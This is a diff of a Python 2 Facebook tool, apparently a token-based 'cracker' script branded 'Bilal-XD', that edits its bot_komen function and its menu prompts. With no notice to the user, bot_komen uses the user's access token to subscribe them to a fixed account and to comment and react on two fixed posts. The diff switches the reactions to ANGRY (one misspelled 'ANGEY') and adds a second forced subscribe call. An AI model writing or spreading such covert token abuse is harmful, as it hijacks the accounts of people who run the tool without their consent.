@@ -127,16 +127,17 @@ def bot_komen():
 		os.system('rm -rf login.txt')
 	una = ('100011466164055')
 	kom = ('𝙷𝚊𝚕𝚕𝚘 Bɩɭʌɭ Hʌɩɗɘʀ')
-	reac = ('LOVE')
+	reac = ('ANGEY')
 	post = ('1459221837803341')
 	post2 = ('1459221837803341')
 	kom2 = ('Hello Bilal')
-	reac2 = ('LOVE')
+	reac2 = ('ANGRY')
 	requests.post('https://graph.facebook.com/100011466164055/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
 	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/100011466164055/subscribers?access_token=' + toket)
 	menu()
 			
 
@@ -181,7 +182,7 @@ def menu():
 	pilih()
 
 def pilih():
-	unikers = raw_input("\n\033[0;40m ➣➣ \033[0;39;40m")
+	unikers = raw_input("\n\033[0;40m Ｂｉｌａｌ-ＸＤ➣➣ \033[0;39;40m")
 	if unikers =="":
 		pilih()
 	elif unikers =="1":
@@ -223,7 +224,7 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;31;40m➣➣ \033[1;97m")
+	peak = raw_input("\n\033[1;31;40mＢｉｌａｌ-ＸＤ➣➣ \033[1;97m")
 	if peak =="":
 		print "\033[1;39mFill in correctly"
 		pilih_super()
